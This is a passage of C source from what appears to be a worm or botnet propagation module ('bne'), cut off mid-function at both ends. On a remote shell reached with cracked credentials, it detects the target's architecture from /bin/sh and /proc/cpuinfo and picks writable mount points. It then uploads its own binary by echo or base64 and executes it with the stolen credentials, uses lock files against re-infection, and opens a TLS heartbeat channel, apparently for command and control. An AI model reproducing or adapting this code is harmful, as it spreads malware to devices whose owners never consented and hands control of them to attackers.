					"bne sh@%"PRIxPTR"\t: sudo failed\n",
					(uintptr_t)ctx);
			}
			goto END;
		}
	}

	// Define upload guard function
	ret = bne_sh_runcmd(s_ctx, UPLOAD_GUARD_F);
	if (!ret) {
		ctx->result.err = errno;
		goto END;
	}

	bne_free_sh_parser(&parser);
	bne_init_sh_parser(&parser);
	parser.ctx = s_ctx;
	parser.line_f = bne_sh_availcmd_parse_f;

	/* FIXME
	* DO NOT assume that /dev is available
	*/
	ret = bne_sh_runcmd_line(
		s_ctx,
		&parser,
		AVAILCMD_CMD);
	if (!ret) {
		ctx->result.err = errno;
		goto END;
	}
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
		prne_dbgpf(
			"bne sh@%"PRIxPTR"\t: available commands - ",
			(uintptr_t)ctx);
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) {
			prne_dbgpf("echo ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT) {
			prne_dbgpf("cat ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_DD) {
			prne_dbgpf("dd ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_BASE64) {
			prne_dbgpf("base64 ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_SLEEP) {
			prne_dbgpf("sleep ");
		}
		prne_dbgpf("\n");
	}
	if (!((s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) &&
		(s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT)))
	{
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: "
				"echo and cat unavailable on this system\n",
				(uintptr_t)ctx);
		}
		ctx->result.err = ENOSYS;
		goto END;
	}

	{
		// read /proc/mounts
		bne_mp_parse_ctx_t mpc;

		prne_memzero(&mpc, sizeof(bne_mp_parse_ctx_t));
		bne_free_sh_parser(&parser);
		bne_init_sh_parser(&parser);
		parser.ctx = &mpc;
		parser.line_f = bne_sh_mounts_parse_f;
		mpc.s_ctx = s_ctx;

		if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/mounts;")) {
			ctx->result.err = errno;
			goto END;
		}
		if (mpc.err != 0) {
			ctx->result.err = mpc.err;
			goto END;
		}
	}

	if (s_ctx->up_loc.size == 0) {
		// no suitable mount point found
		ctx->result.err = ENOSPC;
		goto END;
	}
	// sort candidate mount points
	mp_cnt = s_ctx->up_loc.size;
	mp_arr = (bne_mp_t*)prne_malloc(sizeof(bne_mp_t), mp_cnt);
	if (mp_arr == NULL) {
		ctx->result.err = errno;
		goto END;
	}
	m_ent = s_ctx->up_loc.head;
	for (size_t i = 0; i < mp_cnt; i += 1) {
		mp = (char*)m_ent->element;
		mp_arr[i].path = mp;
		if (strcmp(mp, "/tmp") == 0) {
			mp_arr[i].weight = 4;
		}
		else if (strcmp(mp, "/run") == 0) {
			mp_arr[i].weight = 3;
		}
		else if (strcmp(mp, "/dev/shm") == 0) {
			mp_arr[i].weight = 2;
		}
		else if (strcmp(mp, "/dev") == 0) {
			mp_arr[i].weight = 1;
		}
		else {
			mp_arr[i].weight = 0;
		}
		m_ent = m_ent->next;
	}
	prne_llist_clear(&s_ctx->up_loc);
	qsort(mp_arr, mp_cnt, sizeof(bne_mp_t), bne_mp_cmp_f);
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
		prne_dbgpf(
			"bne sh@%"PRIxPTR"\t: suitable mount points:\n",
			(uintptr_t)ctx);
	}
	for (size_t i = 0, j = mp_cnt - 1; i < mp_cnt; i += 1, j -= 1) {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
			prne_dbgpf("%s\n", mp_arr[j].path);
		}

		if (prne_llist_append(
			&s_ctx->up_loc,
			(prne_llist_element_t)mp_arr[j].path) != NULL)
		{
			mp_arr[j].path = NULL;
		}
		else {
			ctx->result.err = errno;
			goto END;
		}
	}
	prne_free(mp_arr);
	mp_arr = NULL;
	mp_cnt = 0;

	ctx->result.bin_host.os = PRNE_OS_LINUX;
	{
		// determine arch
		bne_sh_elf_parse_ctx_t ep;
		const char *cmd;

		prne_memzero(&ep, sizeof(bne_sh_elf_parse_ctx_t));
		bne_free_sh_parser(&parser);
		bne_init_sh_parser(&parser);
		parser.ctx = &ep;
		parser.bin_f = bne_sh_elf_parse_f;

		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_DD) {
			cmd = "dd if=/bin/sh bs=52 count=1 2> /dev/null;";
		}
		else {
			cmd = "cat /bin/sh;";
		}
		if (!bne_sh_runcmd_bin(s_ctx, &parser, cmd)) {
			goto END;
		}

		if (ep.e_data == 0) {
			ctx->result.err = ENOEXEC;
			goto END;
		}
		if (ep.err != 0) {
			ctx->result.err = ep.err;
			goto END;
		}

		if (ep.e_machine == EM_ARM) {
			// read /proc/cpuinfo
			bne_sh_cpuinfo_parse_ctx_t cpc;

			prne_memzero(&cpc, sizeof(bne_sh_cpuinfo_parse_ctx_t));
			bne_free_sh_parser(&parser);
			bne_init_sh_parser(&parser);
			parser.ctx = &cpc;
			parser.line_f = bne_sh_cpuinfo_parse_f;

			if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/cpuinfo;")) {
				ctx->result.err = errno;
				goto END;
			}

			if (cpc.v7 && cpc.vfp && cpc.thumb) {
				ctx->result.bin_host.arch = PRNE_ARCH_ARMV7;
			}
			else {
				ctx->result.bin_host.arch = PRNE_ARCH_ARMV4T;
			}
		}
		else {
			switch (ep.e_data) {
			case ELFDATA2LSB:
				switch (ep.e_machine) {
				case EM_386:
					ctx->result.bin_host.arch = PRNE_ARCH_I686;
					break;
				case EM_X86_64:
					ctx->result.bin_host.arch = PRNE_ARCH_X86_64;
					break;
				case EM_AARCH64:
					ctx->result.bin_host.arch = PRNE_ARCH_AARCH64;
					break;
				case EM_MIPS:
					ctx->result.bin_host.arch = PRNE_ARCH_MPSL;
					break;
				case EM_SH:
					ctx->result.bin_host.arch = PRNE_ARCH_SH4;
					break;
				case EM_ARC:
					ctx->result.bin_host.arch = PRNE_ARCH_ARC;
					break;
				}
				break;
			case ELFDATA2MSB:
				switch (ep.e_machine) {
				case EM_MIPS:
					ctx->result.bin_host.arch = PRNE_ARCH_MIPS;
					break;
				case EM_PPC:
					ctx->result.bin_host.arch = PRNE_ARCH_PPC;
					break;
				case EM_68K:
					ctx->result.bin_host.arch = PRNE_ARCH_M68K;
					break;
				case EM_ARC:
					ctx->result.bin_host.arch = PRNE_ARCH_ARCEB;
					break;
				}
				break;
			}
		}
	}

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		const char *arch_str = prne_arch_tostr(ctx->result.bin_host.arch);

		if (arch_str == NULL) {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: arch detection failed\n",
				(uintptr_t)ctx);
		}
		else {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: arch: %s\n",
				(uintptr_t)ctx,
				arch_str);
		}
	}
	ret = ctx->result.bin_host.arch != PRNE_ARCH_NONE;

END: // CATCH
	bne_free_sh_parser(&parser);
	for (size_t i = 0; i < mp_cnt; i += 1) {
		prne_free(mp_arr[i].path);
	}
	prne_free(mp_arr);

	return ret;
#undef AVAILCMD_CMD
#undef UPLOAD_GUARD_F
}

static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
	ctx->result.prc = prne_start_bin_rcb_compat(
		&sh_ctx->rcb,
		ctx->result.bin_host,
		ctx->param.rcb->self,
		ctx->param.rcb->m_self,
		ctx->param.rcb->self_len,
		ctx->param.rcb->exec_len,
		ctx->param.rcb->m_dv,
		ctx->param.rcb->dv_len,
		ctx->param.rcb->ba,
		&ctx->result.bin_used);

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		if (ctx->result.prc == PRNE_PACK_RC_OK) {
			if (!prne_eq_bin_host(
					&ctx->result.bin_used,
					&ctx->result.bin_host))
			{
				prne_dbgpf(
					"bne sh@%"PRIxPTR"\t: using compat arch %s\n",
					(uintptr_t)ctx,
					prne_arch_tostr(ctx->result.bin_used.arch));
			}
		}
		else {
			if (ctx->result.prc == PRNE_PACK_RC_ERRNO) {
				ctx->result.err = errno;
			}
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: prne_start_bin_rcb_compat() - %s\n",
				(uintptr_t)ctx,
				prne_pack_rc_tostr(ctx->result.prc));
		}
	}

	return ctx->result.prc == PRNE_PACK_RC_OK;
}

static bool bne_sh_start_ug (bne_sh_ctx_t *sh_ctx) {
	const char *sb[] = {
		"prne_start_ug $$ \"",
		sh_ctx->upload_dir, "\" \"",
		sh_ctx->lockfile, "\" &"
	};
	char *cmd;
	bool ret;

	if (sh_ctx->upload_dir == NULL ||
		(sh_ctx->avail_cmds & BNE_AVAIL_CMD_SLEEP) == 0)
	{
		return true;
	}

	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	if (cmd != NULL) {
		ret = bne_sh_runcmd(sh_ctx, cmd);
	}
	else {
		ret = false;
	}
	prne_free(cmd);

	return ret;
}

static bool bne_sh_cleanup_upload (bne_sh_ctx_t *s_ctx) {
	bool ret = false;
	char *cmd = NULL;
	const char *sb[] = {
		"rm -rf \"", s_ctx->upload_dir, "\"", s_ctx->nl
	};

	if (s_ctx->upload_dir == NULL) {
		return true;
	}

	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	prne_free(s_ctx->upload_dir);
	s_ctx->upload_dir = NULL;
	if (cmd == NULL) {
		return false;
	}

	ret = bne_sh_send(s_ctx, cmd);
	prne_free(cmd);

	return ret;
}

static bool bne_sh_prep_upload (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *dir,
	const char *exec_name,
	const char *mode)
{
	bool ret = false;
	uint8_t uuid[16];
	char uuid_str[37];
	char *cmd = NULL;
	const char *sb_ud[] = { dir, "/.", uuid_str };
	int ec = -1;
	bne_sh_parser_t parser;

	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

	if (!prne_rnd(&ctx->rnd, uuid, 16)) {
		memset(uuid, 0xAF, 16);
	}
	prne_uuid_tostr(uuid, uuid_str);

//TRY
	if (!bne_sh_cleanup_upload(s_ctx)) {
		goto END;
	}
	if (!bne_sh_start_rcb(ctx, s_ctx)) {
		goto END;
	}

	s_ctx->upload_dir = prne_build_str(
		sb_ud,
		sizeof(sb_ud)/sizeof(const char **));
	if (s_ctx->upload_dir == NULL) {
		goto END;
	}
	else {
		const char *sb_cmd[] = {
			"mkdir \"", s_ctx->upload_dir, "\"&&"
			"cd \"", s_ctx->upload_dir, "\"&&"
			"echo -n > \"", exec_name, "\"&&"
			"chmod ", mode, " \"", exec_name, "\";"
			"echo $?;"
		};

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: prep upload on %s\n",
				(uintptr_t)ctx,
				s_ctx->upload_dir);
		}

		cmd = prne_build_str(
			sb_cmd,
			sizeof(sb_cmd)/sizeof(const char **));
		if (cmd == NULL) {
			goto END;
		}
	}

	if (!bne_sh_runcmd_line(s_ctx, &parser, cmd)) {
		goto END;
	}
	ret = ec == 0;

END:
	prne_free(cmd);
	bne_free_sh_parser(&parser);
	return ret && bne_sh_start_ug(s_ctx);
}

static bool bne_sh_upload_echo (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
// Assume that the line buffer is at least 1024 bytes to be safe
#define BPC 204
	ssize_t f_ret;
	bool ret = false;
	char hexstr[BPC * 5 + 2 + 1];
	const char *sb[] = {
		"while true; do", s_ctx->nl,
		"    read l", s_ctx->nl,
		"    if [ -z \"$l\" ]; then", s_ctx->nl,
		"        break", s_ctx->nl,
		"    fi", s_ctx->nl,
		"    echo -ne \"$l\"", s_ctx->nl,
		"done > \"", exec, "\";EC=\"$?\"", s_ctx->nl
	};
	char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	char *hexstr_p;
	uint8_t *bin_p;
	bne_sh_parser_t parser;
	int ec = -1;

	prne_static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			"bne sh@%"PRIxPTR"\t: uploading using echo ...\n",
			(uintptr_t)ctx);
	}

	if (!bne_sh_send(s_ctx, cmd)) {
		goto END;
	}
	prne_free(cmd);
	cmd = NULL;

	while (ctx->result.prc != PRNE_PACK_RC_EOF) {
		f_ret = prne_bin_rcb_read(
			&s_ctx->rcb,
			s_ctx->buf,
			BPC,
			&ctx->result.prc,
			&ctx->result.err);
		if (f_ret < 0) {
			goto END;
		}

		if (f_ret > 0) {
			bin_p = s_ctx->buf;
			hexstr_p = hexstr;
			for (size_t i = 0; i < (size_t)f_ret; i += 1) {
				hexstr_p[0] = '\\';
				hexstr_p[1] = '\\';
				hexstr_p[2] = 'x';
				prne_hex_tochar(*bin_p, hexstr_p + 3, true);
				hexstr_p += 5;
				bin_p += 1;
			}
			memcpy(hexstr_p, s_ctx->nl, strlen(s_ctx->nl) + 1);

			if (!s_ctx->flush_f(s_ctx->ctx) || !bne_sh_send(s_ctx, hexstr)) {
				goto END;
			}
		}

		pth_yield(NULL);
	}

	if (!s_ctx->flush_f(s_ctx->ctx) ||
		!bne_sh_send(s_ctx, s_ctx->nl) ||
		!bne_sh_runcmd_line(s_ctx, &parser, "echo $EC;") ||
		ec != 0)
	{
		goto END;
	}
	ret = true;

END:
	bne_free_sh_parser(&parser);
	prne_free(cmd);

	return ret;
#undef BPC
}

static bool bne_sh_upload_base64 (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
// Assume that the line buffer is at least 1024 bytes to be safe
#define BPC (765)
#define BASE64_LEN (4 * (BPC / 3))
	ssize_t f_ret;
	bool ret = false;
	char line[BASE64_LEN + 2 + 1];
	const char *sb[] = {
		"while true; do", s_ctx->nl,
		"    read l", s_ctx->nl,
		"    if [ -z \"$l\" ]; then", s_ctx->nl,
		"        break", s_ctx->nl,
		"    fi", s_ctx->nl,
		"    echo -ne \"$l\"", s_ctx->nl,
		"done | base64 -d > \"", exec, "\";EC=\"$?\"", s_ctx->nl
	};
	char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	bne_sh_parser_t parser;
	int ec = -1;
	size_t len;

	prne_static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			"bne sh@%"PRIxPTR"\t: uploading using base64 ...\n",
			(uintptr_t)ctx);
	}

	if (!bne_sh_send(s_ctx, cmd)) {
		goto END;
	}
	prne_free(cmd);
	cmd = NULL;

	while (ctx->result.prc != PRNE_PACK_RC_EOF) {
		f_ret = prne_bin_rcb_read(
			&s_ctx->rcb,
			s_ctx->buf,
			BPC,
			&ctx->result.prc,
			&ctx->result.err);
		if (f_ret < 0) {
			goto END;
		}

		if (f_ret > 0) {
			mbedtls_base64_encode(
				(unsigned char*)line,
				BASE64_LEN + 1,
				&len,
				s_ctx->buf,
				f_ret);
			memcpy(line + len, s_ctx->nl, strlen(s_ctx->nl) + 1);

			if (!s_ctx->flush_f(s_ctx->ctx) || !bne_sh_send(s_ctx, line)) {
				goto END;
			}
		}

		pth_yield(NULL);
	}

	if (!s_ctx->flush_f(s_ctx->ctx) ||
		!bne_sh_send(s_ctx, s_ctx->nl) ||
		!bne_sh_runcmd_line(s_ctx, &parser, "echo $EC;") ||
		ec != 0)
	{
		goto END;
	}
	ret = true;

END:
	bne_free_sh_parser(&parser);
	prne_free(cmd);

	return ret;
#undef BPC
}

static int bne_sh_run_exec (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
	const char *sb_cmd[] = {
		"\"./", exec, "\" ",
		"\"", s_ctx->host_cred, "\" ",
		"\"", s_ctx->org_id, "\"",
		";echo $?;"
	};
	char *cmd = NULL;
	bne_sh_parser_t parser;
	int ec = -1;
	int ret = -1;

	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

// TRY
	cmd = prne_build_str(sb_cmd, sizeof(sb_cmd)/sizeof(const char*));
	if (cmd == NULL) {
		ctx->result.err = errno;
		goto END;
	}

	if (bne_sh_runcmd_line(s_ctx, &parser, cmd)) {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: exec exit code %d\n",
				(uintptr_t)ctx,
				ec);
		}

		switch (ec) {
		case PRNE_PROONE_EC_OK: // successful launch
			ctx->result.ny_instance = true;
			/* fall-through */
		case PRNE_PROONE_EC_LOCK:
			/*
			* failed to acquire lock
			* assume that a process is already running
			*/
			/*
			* delete the upload dir so the mount point doesn't get stuffed up
			* with temp dirs
			*/
			ret = 1;
			break;
		default:
			ret = 0;
		}
	}

END:
	bne_free_sh_parser(&parser);
	prne_free(cmd);
	return ret;
}

static void bne_sh_build_host_cred (
	bne_sh_ctx_t *s_ctx,
	char *id,
	char *pw)
{
	prne_host_cred_t hc;
	size_t m_len, enc_len;
	uint8_t *m = NULL;
	char *enc = NULL;

	hc.id = id;
	hc.pw = pw;
	prne_enc_host_cred(NULL, 0, &m_len, &hc);
	m = prne_malloc(1, m_len);
	if (m == NULL) {
		goto END;
	}
	prne_enc_host_cred(m, m_len, &m_len, &hc);

	mbedtls_base64_encode(NUL, 0, &enc_len, m, m_len);
	enc = prne_malloc(1, enc_len);
	if (enc == NULL) {
		goto END;
	}
	mbedtls_base64_encode((unsigned char*)enc, enc_len, &enc_len, m, m_len);

	prne_free(s_ctx->host_cred);
	s_ctx->host_cred = enc;

END:
	prne_free(m);
}

static void bne_sh_build_org_id (bne_sh_ctx_t *s_ctx, const uint8_t *id) {
	size_t olen;

	prne_free(s_ctx->org_id);
	s_ctx->org_id = NULL;
	if (id == NULL) {
		return;
	}

	mbedtls_base64_encode(NULL, 0, &olen, id, 16);
	s_ctx->org_id = prne_malloc(1, olen);
	if (s_ctx->org_id == NULL) {
		return;
	}
	mbedtls_base64_encode((unsigned char*)s_ctx->org_id, olen, &olen, id, 16);
}

static const char *bne_sh_build_lockfile (
	bne_sh_ctx_t *s_ctx,
	const char *mp,
	const char *name)
{
	const char *sb[] = { mp, "/.", name };

	s_ctx->lockfile = prne_rebuild_str(
		s_ctx->lockfile,
		sb,
		sizeof(sb)/sizeof(const char*));
	return s_ctx->lockfile;
}

static bool bne_sh_rm_lockfile (bne_sh_ctx_t *sh_ctx) {
	bool ret;

	if (sh_ctx->lockfile != NULL && sh_ctx->has_lock) {
		const char *sb[] = {
			"rm -f \"", sh_ctx->lockfile, "\";"
		};
		char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));

		if (cmd != NULL) {
			ret = bne_sh_runcmd(sh_ctx, cmd);
		}
		else {
			ret = false;
		}
		prne_free(cmd);
	}
	else {
		ret = true;
	}

	sh_ctx->has_lock = false;
	prne_free(sh_ctx->lockfile);
	sh_ctx->lockfile = NULL;
	return ret;
}

/*
* \return -1: syscall error
* \return 0: lock exists
* \return 1: lock acquired
* \return 2: shell error (continue anyway)
*/
static int bne_sh_mk_lockfile (
	bne_sh_ctx_t *sh_ctx,
	const char *mp,
	const char *lock_name)
{
	char *cmd = NULL;
	int ret = -1, ec = -1;
	bne_sh_parser_t parser;

	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

// TRY
	if (!bne_sh_rm_lockfile(sh_ctx)) {
		goto END;
	}

	if (bne_sh_build_lockfile(sh_ctx, mp, lock_name) != NULL) {
/* This is not a good locking mechanism
*
* The perfect mechanism would be...
```
umask 0377
if echo -n > "$LOCKFILE"; then
	echo "Lock acquired"
fi
```
* But this wouldn't work here because root bypasses file modes(the sesion is
* escalated in bne_sh_setup())
*/
		const char *sb[] = {
			"if [ -f \"", sh_ctx->lockfile, "\" ]; then "
				"EC=1;"
			"else "
				"echo -n > \"", sh_ctx->lockfile, "\";"
				"EC=$?;"
			"fi;"
			"echo $EC;"
		};

		cmd = prne_rebuild_str(cmd, sb, sizeof(sb)/sizeof(const char*));
		if (cmd == NULL) {
			goto END;
		}
	}
	else {
		goto END;
	}
	if (!bne_sh_runcmd_line(sh_ctx, &parser, cmd)) {
		goto END;
	}
	ret = ec == 0 ? 1 : 0;
	if (ret > 0) {
		sh_ctx->has_lock = true;
	}

END:
	bne_free_sh_parser(&parser);
	prne_free(cmd);
	return ret;
}

static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
	bool alloc;
	bool ret = false;
	char *exec_name = NULL;
	char *lock_name = NULL;
	bne_sh_upload_ft upload_f;
	int f_ret = 0;

// TRY
	bne_sh_build_host_cred(sh_ctx, ctx->result.cred.id, ctx->result.cred.pw);
	bne_sh_build_org_id(sh_ctx, ctx->param.org_id);

	exec_name = ctx->param.cb.exec_name(ctx->param.cb_ctx);
	if (exec_name == NULL) {
		ctx->result.err = errno;
		goto END;
	}
	if (ctx->param.cb.bne_lock_name != NULL) {
		lock_name = ctx->param.cb.bne_lock_name(ctx->param.cb_ctx);
		if (lock_name == NULL) {
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_sh_setup(ctx, sh_ctx)) {
		goto END;
	}

	prne_llist_clear(&sh_ctx->up_methods);

	// Set up upload methods
	// Insert least favourable method first
	alloc =
		prne_llist_append(
			&sh_ctx->up_methods,
			(prne_llist_element_t)bne_sh_upload_echo) != NULL;
	if (sh_ctx->avail_cmds & BNE_AVAIL_CMD_BASE64) {
		alloc &=
			prne_llist_append(
				&sh_ctx->up_methods,
				(prne_llist_element_t)bne_sh_upload_base64) != NULL;
	}
	if (!alloc) {
		ctx->result.err = errno;
		goto END;
	}

	for (prne_llist_entry_t *e_mp = sh_ctx->up_loc.head;
		e_mp != NULL;
		e_mp = e_mp->next)
	{
		char *mp = (char*)e_mp->element;

		// reverse traverse
		for (prne_llist_entry_t *e_met = sh_ctx->up_methods.tail;
			e_met != NULL;
			e_met = e_met->prev)
		{
			upload_f = (bne_sh_upload_ft)e_met->element;

			if (lock_name != NULL) {
				f_ret = bne_sh_mk_lockfile(sh_ctx, mp, lock_name);
				if (f_ret < 0) {
					ctx->result.err = errno;
					goto END;
				}
				if (f_ret == 0) {
					ret = true;
					goto END;
				}
			}

			ret = bne_sh_prep_upload(
				ctx,
				sh_ctx,
				mp,
				exec_name,
				"700");
			if (!ret) {
				ctx->result.err = errno;
				goto END;
			}

			ret = upload_f(ctx, sh_ctx, exec_name);
			if (!ret) {
				goto END;
			}
			f_ret = bne_sh_run_exec(ctx, sh_ctx, exec_name);
			ret = f_ret > 0;
			if (f_ret != 0) {
				goto END;
			}
		}
	}

END: // CATCH
	if (f_ret >= 0) {
		bne_sh_rm_lockfile(sh_ctx);
	}
	prne_sfree_str(exec_name);
	prne_sfree_str(lock_name);

	return ret;
}

/*******************************************************************************
                               HTBT Vector Impl
*******************************************************************************/
typedef struct {
	prne_net_endpoint_t ep;
	int fd;
	mbedtls_ssl_context ssl;
	prne_iobuf_t netib;
	prne_iobuf_t stdioib;
} bne_vhtbt_ctx_t;

static bool bne_vhtbt_do_handshake (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	pth_event_t *ev)
{
	if (ctx->param.htbt_ssl_conf == NULL) {
		return false;
	}
	mbedtls_ssl_free(&vctx->ssl);
	mbedtls_ssl_init(&vctx->ssl);
	prne_close(vctx->fd);
	vctx->fd = -1;
	if (mbedtls_ssl_setup(&vctx->ssl, ctx->param.htbt_ssl_conf) != 0) {
		return false;
	}
	mbedtls_ssl_set_bio(
		&vctx->ssl,
		&vctx->fd,
		prne_mbedtls_ssl_send_cb,
		prne_mbedtls_ssl_recv_cb,
		NULL);

	prne_pth_reset_timer(ev, &BNE_CONN_OP_TIMEOUT);
	if (!bne_do_connect(&vctx->fd, &vctx->ep, *ev) || vctx->fd < 0) {
		return false;
	}
	if (!prne_mbedtls_pth_handle(
			&vctx->ssl,
			mbedtls_ssl_handshake,
			vctx->fd,
			*ev,
			NULL))
	{
		return false;
	}
	return prne_mbedtls_verify_alp(
		ctx->param.htbt_ssl_conf,
		&vctx->ssl,
		PRNE_HTBT_TLS_ALP);
}

static ssize_t bne_vhtbt_read (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	void *buf,
	const size_t len,
	pth_event_t ev)
{
	int f_ret;
	struct pollfd pfd;

	while (true) {
		f_ret = mbedtls_ssl_read(&vctx->ssl, (unsigned char*)buf, len);
		if (f_ret >= 0) {
			return f_ret;
		}

		switch (f_ret) {
		case MBEDTLS_ERR_SSL_WANT_READ:
			pfd.events = POLLIN;
			break;
		case MBEDTLS_ERR_SSL_WANT_WRITE:
			pfd.events = POLLOUT;
			break;
		default: return f_ret;
		}
		pfd.fd = vctx->fd;

		prne_pth_poll(&pfd, 1, -1, ev);
		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
			errno = ETIMEDOUT;
			return -1;
		}
	}
}

static ssize_t bne_vhtbt_write (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	const void *buf,
	const size_t len,
	pth_event_t ev)
{
	int f_ret;
	struct pollfd pfd;

	while (true) {
		f_ret = mbedtls_ssl_write(&vctx->ssl, (const unsigned char*)buf, len);
		if (f_ret >= 0) {
			return f_ret;
		}

		switch (f_ret) {
		case MBEDTLS_ERR_SSL_WANT_READ:
			pfd.events = POLLIN;
			break;
		case MBEDTLS_ERR_SSL_WANT_WRITE:
			pfd.events = POLLOUT;
			break;
		default: return f_ret;
		}
		pfd.fd = vctx->fd;

		prne_pth_poll(&pfd, 1, -1, ev);
		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
			errno = ETIMEDOUT;
			return -1;
		}
	}
}

static bool bne_vhtbt_flush (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	const void *buf,
	size_t len,
	pth_event_t ev)
{
	ssize_t io_ret;

	while (len > 0) {
		io_ret = bne_vhtbt_write(ctx, vctx, buf, len, ev);
		if (io_ret < 0) {
			return false;
		}
		if (io_ret == 0) {
			return false;
		}

		buf = (const uint8_t*)buf + io_ret;
		len -= io_ret;
	}

	return true;
}

static bool bne_vhtbt_flush_ib (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	prne_iobuf_t *ib,
	pth_event_t ev)
{
	const bool ret = bne_vhtbt_flush(ctx, vctx, ib->m, ib->len, ev);
	if (ret) {
		prne_iobuf_reset(ib);
	}
	return ret;
}

static bool bne_vhtbt_recvf (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	void *f,
	prne_htbt_dser_ft dser_f,
	pth_event_t ev)
{
	size_t actual;
	prne_htbt_ser_rc_t rc;
	ssize_t f_ret;


	while (true) {
		rc = dser_f(vctx->netib.m, vctx->netib.len, &actual, f);

		switch (rc) {
		case PRNE_HTBT_SER_RC_OK:
			prne_iobuf_shift(&vctx->netib, -actual);
			return true;
		case PRNE_HTBT_SER_RC_MORE_BUF:
			if (actual > vctx->netib.size) {
				return false;
			}
			break;
		case PRNE_HTBT_SER_RC_ERRNO:
			return false;
		default:
			return false;
		}

		f_ret = bne_vhtbt_read(
			ctx,
			vctx,
			vctx->netib.m + vctx->netib.len,
			actual - vctx->netib.len,
			ev);
		if (f_ret == 0) {
			return false;
		}
		if (f_ret < 0) {
			return false;
		}
		prne_iobuf_shift(&vctx->netib, f_ret);
	}
}

static bool bne_vhtbt_sendf (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	const void *f,
	prne_htbt_ser_ft ser_f,
	pth_event_t ev)
{
	ssize_t f_ret;
	size_t actual;
	prne_htbt_ser_rc_t rc;

	prne_iobuf_reset(&vctx->netib);
	rc = ser_f(
		vctx->netib.m,
		vctx->netib.avail,
		&actual,
		f);
	switch (rc) {
	case PRNE_HTBT_SER_RC_OK: break;
	case PRNE_HTBT_SER_RC_ERRNO:
		return false;
	default:
		return false;
	}
	prne_iobuf_shift(&vctx->netib, actual);

	while (vctx->netib.len > 0) {
		f_ret = bne_vhtbt_write(
			ctx,
			vctx,
			vctx->netib.m,
			vctx->netib.len,
			ev);
		if (f_ret == 0) {
			return false;
		}
		if (f_ret < 0) {
			return false;
		}
		prne_iobuf_shift(&vctx->netib, -f_ret);
	}

	return true;
}

static bool bne_vhtbt_recv_mh (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	prne_htbt_msg_head_t *mh,
	pth_event_t ev)
{
	return bne_vhtbt_recvf(
		ctx,
		vctx,
		mh,
		(prne_htbt_dser_ft)prne_htbt_dser_msg_head,
		ev);
}

static bool bne_vhtbt_send_mh (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	const prne_htbt_msg_head_t *mh,
	pth_event_t ev)
{
	return bne_vhtbt_sendf(
		ctx,
		vctx,
		mh,
		(prne_htbt_ser_ft)prne_htbt_ser_msg_head,
		ev);
}

static bool bne_vhtbt_recv_status (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	prne_htbt_status_t *st,
